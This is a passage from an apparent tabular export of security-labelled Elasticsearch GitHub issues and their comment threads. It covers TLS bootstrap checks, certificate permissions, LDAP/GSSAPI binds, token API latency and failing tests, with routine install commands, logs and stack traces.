at java.lang.reflect.Method.invoke(Method.java:498)
at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1750)
at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:938)
at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:974)
at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:988)
at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:49)
at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:48)
at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:817)
at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:468)
at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:947)
at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:832)
at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:883)
at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:894)
at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:41)
at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:54)
at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
at java.lang.Thread.run(Thread.java:748)
[2020-02-05T17:36:58,178][INFO ][o.e.x.c.s.a.a.DocumentSubsetBitsetCacheTests] [testCacheUnderConcurrentAccess] before test
[2020-02-05T17:36:58,764][INFO ][o.e.x.c.s.a.a.DocumentSubsetBitsetCache] [[pool-6-thread-13]] the Document Level Security BitSet cache is full which may impact performance; consider increasing the value of [xpack.security.dls.bitset.cache.size]
[2020-02-05T17:36:59,723][INFO ][o.e.x.c.s.a.a.DocumentSubsetBitsetCacheTests] [testCacheUnderConcurrentAccess] after test
```

Looks like the timeout chosen (1s) could be too small.","Pinging @elastic/es-security (:Security/Security)There are a lot of these. This one is failing pretty consistently once or twice a day since it was introduced a couple weeks back. 👍 on bumping the timeout here in necessary or perhaps trying to slim this test down a bit. 2+ seconds for a unit test seems a bit hefty IMO.

https://gradle-enterprise.elastic.co/scans/tests?failures.failureClassification=non_verification&list.offset=0&list.size=50&list.sortColumn=startTime&list.sortOrder=desc&search.buildOutcome=failure&search.buildToolType=gradle&search.buildToolType=maven&search.startTimeMax=1581058189946&search.startTimeMin=1578556800000&search.tags=CI&search.tags=not:nested&search.tags=not:pull-request&tests.container=org.elasticsearch.xpack.core.security.authz.accesscontrol.DocumentSubsetBitsetCacheTests&tests.sortField=FAILED&tests.test=testCacheUnderConcurrentAccess&tests.unstableOnly&trends.section=overview&trends.timeResolution=day&viewer.tzOffset=-480Muting",no,">test-failure,:Security/Security,Team:Security,"
elastic/elasticsearch,317449751,"[Security] Add hostname/FQDN documentation for filtering","*Original comment by @gmoskovicz:*

See LINK REDACTED

`xpack.security.transport.filter.allow` seems to be needed the FQDN and no hostnames, regardless that the hostnames are resolving internally in each node. If you use the FQDN it will work. I tried to look around the repository but we don't have tests for this neither the documentation explicitly mentions that we need FQDN to work?

CC @jaymode ","*Original comment by @jaymode:*

This is pretty hard to test since you would need to setup DNS or some other way to resolve names. I think doc wise we can add something to that effect.*Original comment by @gmoskovicz:*

@jaymode docs will be a good idea. Do you know if FQDN is required, or this should work with hostnames?*Original comment by @jaymode:*

It is dependent on what reverse DNS resolves IIRC*Original comment by @gmoskovicz:*


If the hostname is setinside the allow filter, it doesn't work. If the FQDN or IP addressis set, it does work. So i think that FQDN is required. Hence my request 🙂 [docs issue triage]",no,">enhancement,>docs,:Security/Security,Team:Security,"
elastic/elasticsearch,519846295,"[Bug] Nodes can't be restarted in a Cluster with xpack.security.enabled: true","<!-- Bug report -->

**Elasticsearch version** (`bin/elasticsearch --version`): 7.2.1

**Plugins installed**: [analysis-phonetic]

**JVM version** (`java -version`): open jdk 11.0.4

**OS version** (`uname -a` if on a Unix-like system): Ubuntu 18.04 LTS

**Description of the problem including expected versus actual behavior**:

***Actual behavior:*** 
When creating a Cluster with"" xpack.security.enabled: true"" and no ""xpack.security.transport.ssl.enabled"" setting each node initially starts fine. When restarting the nodes, elastic refuses to start saying that ""xpack.security.transport.ssl.enabled"" has to be enabled.

***Expected behavior:*** 
Either the cluster works all the time in in non-TLS mode when the security is active or the nodes refuse their initail start if there are some masternodes defined.

**Steps to reproduce**:

 1. Setup multiple different machines
 2. Install Elasticsearch on all the machines
 3. Set ""xpack.security.enabled: true"" and declare some masternodes
 4. Start Elasticsearch on all the machines at the same time
 5. The cluster should now be running fine
 6. Restart the elasticsearch service on one or multiple nodes
 7. The nodes refuse to start

**Provide logs (if relevant)**:

[1] bootstrap checks failed
[1]: Transport SSL must be enabled if security is enabled on a [basic] license. Please set [xpack.security.transport.ssl.enabled] to [true] or disable security by setting [xpack.security.enabled] to [false]
","Pinging @elastic/es-security (:Security/Security)We should do a better job here, but I don't know what that would look like.

The problem is that SSL is not required on a trial license, which means that we can only enforce the bootstrap check if we know the license type, and a newly started node does not know what license the cluster will have. For maximum compatibilty, we don't enforce SSL unless/until we know which license type is in use.

If we switched to enforcing SSL on trial, that would solve this, but has impacts on users.

We could fail the node as soon as we know that it has a non-trial license but doesn't have SSL. We had code to do something like that before, but we removed it because it caused other issues. We might need to bring it back.This is especially problematic as I understood that there's no way to buy a license, the only option is to use Elastic Cloud.
We have a Helm Chart configured with an ingress that provides SSL, now it's impossible to upgrade the version of Elasticsearch. At the initial experiments, everything went smoothly with the HTTP auth and the ingress-provided SSL.Actually it seems based on `TLSLicenseBootstrapCheckTests`, it has nothing to do with licensing. `testBootstrapCheckFailureOnPremiumLicense` expects the failure too, so the error message is highly misleading.",no,":Security/Security,Team:Security,"
elastic/elasticsearch,1140542059,"Role / Index privileges - Ability to filter in/out on indices","### Description

Hello,

It would be great to be able to have a way to exclude some indices from the index privilege.

For example:
User to have access to all indices "" * "" except the system indices "" .* ""
indices to access are "" * "" and not "" .* ""

Current workaround is to explicitly specify  the indices user would have access to, but would like to have way to filter out indices.","Pinging @elastic/es-security (Team:Security)Hi @alaa-mallah, you can actually do it by using a [regular expression](https://www.elastic.co/guide/en/elasticsearch/reference/current/regexp-syntax.html) as pattern.

Something like this: `""/~([.].*)/""`
- Anything NOT matching
- a dot
- possibly followed by any other char

Please review and test before use, I've not checked it and it's provided just as an example.
If you need to get support for a specific regex, you can use the [discuss forum](https://discuss.elastic.co/).

I hope this helps.",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1277336161,"Permission denied for `/etc/elasticsearch/certs/http_ca.crt` after install on Debian","### Elasticsearch Version

8.2.2

### Installed Plugins

_No response_

### Java Version

_bundled_

### OS Version

Ubuntu 20.04 LTS, and
Ubuntu 22.04 LTS (Linux ncc-1701-d 5.15.0-39-generic #42-Ubuntu SMP Thu Jun 9 23:42:32 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux)

### Problem Description

I reproduced a `Security on by default` issue in [Discuss](https://discuss.elastic.co/t/new-install-error-setting-certificate-verify-locations/307455) related to Ubuntu/Debian install.
- https://discuss.elastic.co/t/new-install-error-setting-certificate-verify-locations/307455

HTTPS certs (CA and server) are generated at install time. However, they are placed in a directory with no global read permission. Non-privileged users cannot access the HTTPS CA cert for use in HTTPS clients (ex: curl).

This seems like an install issue for how permissions are setup during install.

### Steps to Reproduce

Install and Run Elasticsearch (as per [the Discuss problem description](https://discuss.elastic.co/t/new-install-error-setting-certificate-verify-locations/307455))
```
wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo gpg --dearmor -o /usr/share/keyrings/elasticsearch-keyring.gpg
sudo apt-get install apt-transport-https
echo ""deb [signed-by=/usr/share/keyrings/elasticsearch-keyring.gpg] https://artifacts.elastic.co/packages/8.x/apt stable main"" | sudo tee /etc/apt/sources.list.d/elastic-8.x.list
sudo apt-get update
sudo apt-get install elasticsearch
sudo systemctl start elasticsearch.service
```

Reproduce the permissions issue with `curl`
```
$ curl --cacert /etc/elasticsearch/certs/http_ca.crt -u elastic https://localhost:9200/
curl: (77) error setting certificate file: /etc/elasticsearch/certs/http_ca.crt
```

Demonstrate the permissions issue with `ls`
```
$ ls -l /etc/elasticsearch/certs/http_ca.crt
ls: cannot access '/etc/elasticsearch/certs/http_ca.crt': Permission denied

$ ls -l /etc | grep elasticsearch
drwxr-s---  4 root elasticsearch  4096 Jun 17 09:21 elasticsearch

$ ls -l /var/log | grep elasticsearch
drwxr-s---  2 elasticsearch     elasticsearch       4096 Jun 17 09:29 elasticsearch
```

### Logs (if relevant)

n/a","Pinging @elastic/es-core-infra (Team:Core/Infra)Pinging @elastic/es-security (Team:Security)Pinging @elastic/es-delivery (Team:Delivery)Thanks for looking into this. This issue has affected everyone I know who has tried to install ES recently.@jkakavas do you see any issue with the security by default generated public certs having global read permissions?> @jkakavas do you see any issue with the security by default generated public certs having global read permissions?

No, I think the `http_ca.crt` can ( and should be ) world readable. It was an oversight that we didn't do it in the first place, not a conscious design decision. 

cc @albertzaharovits @albertzaharovits where you able to take a look at this?Any updates on this issue? Below is what I was able to achieve with copying the `http_ca.crt` into  /usr/local/share/ca-certificates/certs/ then `ln -s` to `/etc/ssl/certs`

when I copy and link cert :

`cp /etc/elasticsearch/certs/http_ca.crt /usr/local/share/ca-certificates/certs/http_ca.crt`
`chmod 640  /usr/local/share/ca-certificates/certs/http_ca.crt`
`c_rehash  /usr/local/share/ca-certificates/certs/`

`cd /etc/ssl/certs`
`ln -s /usr/local/share/ca-certificates/http_ca.crt http_ca.crt`
`chmod 640 /etc/ssl/certs/http_ca.crt`
`c_rehash`

NOTE: ownership is already set to root:root on /etc/ssl/certs/http_ca.crt

then run curl cmd:

`curl --cacert /etc/ssl/certs/http_ca.crt -u elastic https://localhost:9200/` 

I get the desired results; ES summary data. 

`curl --cacert /etc/elasticsearch/certs/http_ca.crt -u elastic https://localhost:9200/` 
continues to generate the curl 77 error mentioned in the original post. Even after this change.  

I am guessing/hoping that I can update the `elasticsearch.yml` to point to the cert in `/etc/ssl/certs` and everything will work without issue. Until there is an update that could break that connection. 
 
I am using ubuntu server 20.04 LTS // ES 8.4",no,">bug,:Delivery/Packaging,:Security/TLS,Team:Security,Team:Delivery,:Security/AutoConfiguration,"
elastic/elasticsearch,800185427,"Update saml-guide.asciidoc","Clarifying Elasticsearch won't start if idp.entity_id incorrectly defined

<!--
Thank you for your interest in and contributing to Elasticsearch! There
are a few simple things to check before submitting your pull request
that can help with the review process. You should delete these items
from your submission, but they are here to help bring them to your
attention.
-->

- Have you signed the [contributor license agreement](https://www.elastic.co/contributor-agreement)?
- Have you followed the [contributor guidelines](https://github.com/elastic/elasticsearch/blob/master/CONTRIBUTING.md)?
- If submitting code, have you built your formula locally prior to submission with `gradle check`?
- If submitting code, is your pull request against master? Unless there is a good reason otherwise, we prefer pull requests against master and will backport as needed.
- If submitting code, have you checked that your submission is for an [OS and architecture that we support](https://www.elastic.co/support/matrix#show_os)?
- If you are submitting this code for a class then read our [policy](https://github.com/elastic/elasticsearch/blob/master/CONTRIBUTING.md#contributing-as-part-of-a-class) for that.
","Pinging @elastic/es-docs (Team:Docs)Users are not expecting Elasticsearch won't start if this setup is incorrectly configured.
This is also discussed here:
[https://github.com/elastic/elasticsearch/issues/37608](https://github.com/elastic/elasticsearch/issues/37608)Pinging @elastic/es-security (Team:Security)@merlixelastic please enable the option ""Allow edits and access to secrets by maintainers"" on your PR. For more information, [see the documentation](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/allowing-changes-to-a-pull-request-branch-created-from-a-fork).",yes,">docs,:Security/Authentication,Team:Docs,Team:Security,v8.6.0,"
elastic/elasticsearch,419075118,"Implement GSSAPIBindRequest in the LDAP Realm","<!--

** Please read the guidelines below. **

Issues that do not follow these guidelines are likely to be closed.

1.  GitHub is reserved for bug reports and feature requests. The best place to
    ask a general question is at the Elastic [forums](https://discuss.elastic.co).
    GitHub is not the place for general questions.

2.  Is this bug report or feature request for a supported OS? If not, it
    is likely to be closed.  See https://www.elastic.co/support/matrix#show_os

3.  Please fill out EITHER the feature request block or the bug report block
    below, and delete the other block.

-->

<!-- Feature request -->

**Describe the feature**: Implement the `GSSAPIBindRequest` in the LDAP Realm to enable Elasticsearch to use a Kerberos keytab file to authenticate against the LDAP service instead of a username and password.","Pinging @elastic/es-securityI started my investigations to support `GSSAPIBindRequest`, but I think we have more to this user story.
IMO we should also consider support for SASL mechanisms supported by AD/LDAP like EXTERNAL, GSSAPI  (not considering least secure options to reduce the number of supported mechanisms)
Right now we only support `SimpleBindRequest` and sometimes this may not be available in the enterprise.
Thoughts? @tvernum @jaymode What is your concrete proposal? Have you seen requests for those features? Do you have a plan to test those features? Just because the library we use supports it, doesn't mean we need to. It is always easier to add code later on than it is to remove it.Except for the support of `GSSAPIBindRequest`, we do not have any requests to support other SASL mechanisms.
Initially I did thought about adding support for others but then testing all of the mechanisms is behemoth.
+1 on avoiding adding code if we do not need it now.

My proposal is to build the BindRequest as per the configuration and have a builder which does the switch based on the configured mode. This way we can just add another builder to support other SASL mechanism in future, something like following:

```
public class BindRequestBuilder {
      BindRequest buildBindRequest(RealmConfig config) {
           BindRequest bindRequest = null;
           switch(mode) {
                case ""simple"":
                     bindRequest = SimpleBindRequestBuilder.build(config);
                     break;
                case ""sasl_gssapi"":
                     bindRequest = GSSAPIBindRequestBuilder.build(config);
                     break;
                 default:
                     throw new Unsupported...
           }
           return bindRequest;
      }
}
```Hi team
do you have an update on this issue please?We currently do not have any plans to work on this. ",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,317453865,"_cat/aliases returns a 404 if no index aliases are present","*Original comment by @seang-es:*

To repro:

1.  Fresh install of Elasticsearch 5.6.x, no x-pack
2. Use curl to GET _cat/aliases
3. Result should be empty.
4. Install x-pack
5. Repeat test.  Result will now be a 404 error.

This behavior should be consistent whether x-pack is present or not.  I believe _aliases itself is supposed to return a 404 in all cases (https://github.com/elastic/elasticsearch/pull/25043).  Users have expressed a preference for returning nothing in this situation.","So what is the correct response ?

A. empty 

OR 

B. 404 > A. empty

👍 For the record, I have a local install of ES 7.11.1 running as a single a single node. So no clustering. 

```
▶ xh http://localhost:9200/
HTTP/1.1 200 OK
Content-Encoding: gzip
Content-Length: 338
Content-Type: application/json; charset=UTF-8

{
    ""name"": ""MBP-GitHub.attlocal.net"",
    ""cluster_name"": ""elasticsearch"",
    ""cluster_uuid"": ""73ZfZpFfQ2ilHInvzE6D4Q"",
    ""version"": {
        ""number"": ""7.11.1"",
        ""build_flavor"": ""default"",
        ""build_type"": ""tar"",
        ""build_hash"": ""ff17057114c2199c9c1bbecc727003a907c0db7a"",
        ""build_date"": ""2021-02-15T13:44:09.394032Z"",
        ""build_snapshot"": false,
        ""lucene_version"": ""8.7.0"",
        ""minimum_wire_compatibility_version"": ""6.8.0"",
        ""minimum_index_compatibility_version"": ""6.0.0-beta1""
    },
    ""tagline"": ""You Know, for Search""
}

▶ xh http://localhost:9200/_cat/aliases
HTTP/1.1 200 OK
Content-Length: 0
Content-Type: text/plain; charset=UTF-8

```

So no indexes (and no aliases) leads to 200 OK with an empty output. Quite understandable and predictable. Perhaps when you run a master/data nodes cluster or using x-pack, it behaves differently. ",no,">bug,:Security/Security,Team:Security,"
elastic/elasticsearch,853389028,"Improve response time of the get token api","Following discussion with @ywangd:

Creating a new token means indexing a new document in the `.security-tokens-7` index. This indexing request is issued with [refresh=wait_for](https://www.elastic.co/guide/en/elasticsearch/reference/current/docs-refresh.html#docs-refresh), which means it waits for the next index refresh to happen before returning to the caller (by default 1s). Depending on exactly when the document is indexed, it can in worst cases wait for the refresh interval before returning.

Token creation API currently has `refresh=wait_for` hardcoded and does not allow override this value with query parameter. This could be something for us to improve since (1) many other security APIs do support it and (2) direct authentication with the new token does not require search. ","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1335872768,"Update create-users.asciidoc","I have added an example of how to create a user using python (Flask)
","
https://user-images.githubusercontent.com/73925826/184131519-6c6992f8-9f30-4a9e-913d-2f1824538e86.mp4

Pinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-security (Team:Security)",yes,">docs,:Security/Security,Team:Docs,Team:Security,external-contributor,v8.3.4,"
elastic/elasticsearch,317455134,"Security BWC tests with more complex cluster topologies","*Original comment by @tvernum:*

The change to introduce the `_xpack_security` system user (LINK REDACTED) seems to have had a couple of different BWC issues that weren't picked up by our tests.

1. If a new node, tried to load security data from an old node, it would try to use the new user and fail because the old node didn't recognise the `_xpack_security` system user. (Fixed in LINK REDACTED)
LINK REDACTED

2. If an old node tried to load  security data from a new node, it would try to use the old user and fail because the older user no longer has permission to read security data. (Also fixed in LINK REDACTED) LINK REDACTED

It would be helpful to have some security tests that run with the sorts of more complex cluster setups (dedicated coordinating nodes, dedicated master nodes) that pull out these issues.
","*Original comment by @geekpete:*

So for clarification, was this not an issue if all the nodes were master-data role?*Original comment by @tvernum:*

> was this not an issue if all the nodes were master-data role

Maybe, but less likely. Because the security index is replicated to all nodes, there typically isn't a need for a node to load security data from another node.
Unless:
- You have non-data nodes
- In a mixed-version cluster, when the master will decide not to assign a replica to a node that is on a higher version than the primary.

So our simple 2-3 node BWC tests tend not to hit as many of the problem scenarios as you can get in some real world configurations. They _can_ happen in those simple setups, but far less often.*Original comment by @s1monw:*

we talked about it in fixit friday and we thing we should start working on this. I will make it adopt me",no,">test,help wanted,:Security/Security,Team:Security,"
elastic/elasticsearch,317447920,"Security exception in ES logs on 6.0.0-beta1","*Original comment by @bhavyarm:*

I am logging this on x-pack-elasticsearch after discussing it with Kibana monitoring team. I logged this yesterday on Kibana x-pack: LINK REDACTED
Not quite sure whats happening here and we can't reproduce it successfully. 

**Kibana version**: 6.0.0-beta1

**Elasticsearch version**: 6.0.0-beta1

**Server OS version**: darwin_x86_64

**Browser version**: chrome latest

**Browser OS version**: OS X

**Original Kibana install method (e.g. download page, yum, from source, etc.)**: from staging: LINK REDACTED

**Original X-Pack install method (e.g. by name, offline install, from source, etc.)**: from staging

**Description of the problem including expected versus actual behavior**: I used this to set up keystore and password in BC1 for 6.0.0-beta1:

-   create keystore  -  bin/elasticsearch-keystore create
-   add the password -  echo ""changeit"" | bin/elasticsearch-keystore add -x 'bootstrap.password'
-   add user elastic and password changeit to kibana.yml (edited)

I was able to login with elastic:changeit into Kibana and load data. Created some visualizations/dashboards. Generated reports. Everything looked good. But after I brought ES/Kibana down and then bought them up again. Kibana doesn't work with x-pack anymore. And ES log has errors. 

I restarted ES and Kibana and things went back to normal.

ES logs:

```2017-07-26T12:11:34,610][ERROR][o.e.x.s.a.e.NativeUsersStore] [KZuroLm] failed to retrieve built in user [elastic] info
org.elasticsearch.action.NoShardAvailableActionException: No shard available for [get [.security][doc][reserved-user-elastic]: routing [null]]
    at org.elasticsearch.action.support.single.shard.TransportSingleShardAction$AsyncSingleAction.perform(TransportSingleShardAction.java:209) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
    at org.elasticsearch.action.support.single.shard.TransportSingleShardAction$AsyncSingleAction.start(TransportSingleShardAction.java:186) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
    at org.elasticsearch.action.support.single.shard.TransportSingleShardAction.doExecute(TransportSingleShardAction.java:95) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
    at org.elasticsearch.action.support.single.shard.TransportSingleShardAction.doExecute(TransportSingleShardAction.java:59) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
    at org.elasticsearch.action.support.TransportAction.doExecute(TransportAction.java:143) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
    at org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:167) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
    at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$apply$0(SecurityActionFilter.java:104) ~[?:?]
```
and

```[2017-07-26T12:11:34,633][ERROR][o.e.x.s.a.e.ReservedRealm] [KZuroLm] failed to retrieve password hash for reserved user [elastic]
[2017-07-26T12:11:34,633][ERROR][o.e.x.s.a.e.ReservedRealm] [KZuroLm] failed to retrieve password hash for reserved user [elastic]
[2017-07-26T12:11:34,633][INFO ][o.e.x.s.a.AuthenticationService] [KZuroLm] Authentication of [elastic] was terminated by realm [reserved] - failed to authenticate user [elastic]
[2017-07-26T12:11:34,633][INFO ][o.e.x.s.a.AuthenticationService] [KZuroLm] Authentication of [elastic] was terminated by realm [reserved] - failed to authenticate user [elastic]
[2017-07-26T12:11:35,005][WARN ][o.e.x.s.b.BootstrapElasticPassword] [KZuroLm] elastic password was not bootstrapped because its password was already set
```

and

Kibana login screen says:
Login is currently disabled because the license could not be determined. Please check that Elasticsearch has the X-Pack plugin installed and is reachable, then refresh this page.

Kibana server log:

```log   [16:11:37.195] EMAIL REDACTED Status changed from red to green - Ready
  log   [16:11:37.254] EMAIL REDACTED Status changed from red to green - Kibana index ready
  log   [16:11:37.255] [info][status][ui settings] Status changed from red to green - Ready
  log   [16:11:37.255] EMAIL REDACTED Status changed from red to green - Ready
  log   [16:11:37.256] EMAIL REDACTED Status changed from red to green - Ready
  log   [16:11:37.257] EMAIL REDACTED Status changed from red to green - Ready
  log   [16:11:37.259] EMAIL REDACTED Status changed from red to green - Ready
  log   [16:11:37.260] EMAIL REDACTED Status changed from red to green - Ready
  log   [16:11:37.261] EMAIL REDACTED Status changed from red to green - Ready
  log   [16:11:37.262] EMAIL REDACTED Status changed from red to green - Ready
  log   [16:11:37.262] EMAIL REDACTED Status changed from red to green - Ready
  log   [16:11:37.263] EMAIL REDACTED Status changed from red to green - Ready
  log   [16:11:37.264] EMAIL REDACTED Status changed from red to green - Ready

```

I have valid trial license:
```
{
  ""name"" : ""KZuroLm"",
  ""cluster_name"" : ""elasticsearch"",
  ""cluster_uuid"" : ""IbCWTVOKRKaSl4NDcAGriA"",
  ""version"" : {
    ""number"" : ""6.0.0-beta1"",
    ""build_hash"" : ""b4bf9c9"",
    ""build_date"" : ""2017-07-25T22:16:26.225Z"",
    ""build_snapshot"" : false,
    ""lucene_version"" : ""7.0.0"",
    ""minimum_wire_compatibility_version"" : ""5.6.0"",
    ""minimum_index_compatibility_version"" : ""5.0.0""
  },
  ""tagline"" : ""You Know, for Search""
}
```


Kibana login screen:

<img width=""1920"" alt=""kibana_screen"" src=""https://user-images.githubusercontent.com/7074629/28634016-cd0d8578-7203-11e7-84d8-ce30d4bfdda7.png"">

","*Original comment by @bhavyarm:*

@pickypg @tsullivan @rasroh @marius-dr *Original comment by @bhavyarm:*

Happened again on BC3 for 6.0.0 -beta1 today. I had ES and Kibana running with x-pack. Kibana UI was idle for sometime because I was in a meeting. When I looked at it again, I couldn't login. Same errors and screen as in the description above. Even after restarting ES and Kibana/ restarting ES first and then Kibana/ Kibana first and then ES - the auth error is not going away. 

ES Logs:

```
[2017-07-28T12:25:13,096][ERROR][o.e.x.s.a.e.ReservedRealm] [FLMNnD2] failed to retrieve password hash for reserved user [elastic]
[2017-07-28T12:25:13,096][INFO ][o.e.x.s.a.AuthenticationService] [FLMNnD2] Authentication of [elastic] was terminated by realm [reserved] - failed to authenticate user [elastic]
[2017-07-28T12:25:13,050][ERROR][o.e.x.s.a.e.NativeUsersStore] [FLMNnD2] failed to retrieve built in user [elastic] info
org.elasticsearch.action.NoShardAvailableActionException: No shard available for [get [.security][doc][reserved-user-elastic]: routing [null]]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction$AsyncSingleAction.perform(TransportSingleShardAction.java:209) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction$AsyncSingleAction.start(TransportSingleShardAction.java:186) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction.doExecute(TransportSingleShardAction.java:95) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction.doExecute(TransportSingleShardAction.java:59) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1] org.elasticsearch.action.NoShardAvailableActionException: No shard available for [get [.security][doc][reserved-user-elastic]: routing [null]]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction$AsyncSingleAction.perform(TransportSingleShardAction.java:209) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction$AsyncSingleAction.start(TransportSingleShardAction.java:186) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction.doExecute(TransportSingleShardAction.java:95) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction.doExecute(TransportSingleShardAction.java:59) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.TransportAction.doExecute(TransportAction.java:143) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:167) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$apply$0(SecurityActionFilter.java:104) ~[?:?]
	at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:60) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$authorizeRequest$3(SecurityActionFilter.java:178) ~[?:?]
	at org.elasticsearch.xpack.security.authz.AuthorizationUtils$AsyncAuthorizer.maybeRun(AuthorizationUtils.java:124) ~[?:?]
	at org.elasticsearch.xpack.security.authz.AuthorizationUtils$AsyncAuthorizer.setRunAsRoles(AuthorizationUtils.java:118) ~[?:?]
	at org.elasticsearch.xpack.security.authz.AuthorizationUtils$AsyncAuthorizer.authorize(AuthorizationUtils.java:106) ~[?:?]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.authorizeRequest(SecurityActionFilter.java:180) ~[?:?]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$applyInternal$2(SecurityActionFilter.java:157) ~[?:?]
	at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:60) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:195) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$4(AuthenticationService.java:228) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:239) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:193) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:147) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:116) ~[?:?]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.applyInternal(SecurityActionFilter.java:156) ~[?:?]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.apply(SecurityActionFilter.java:116) ~[?:?]
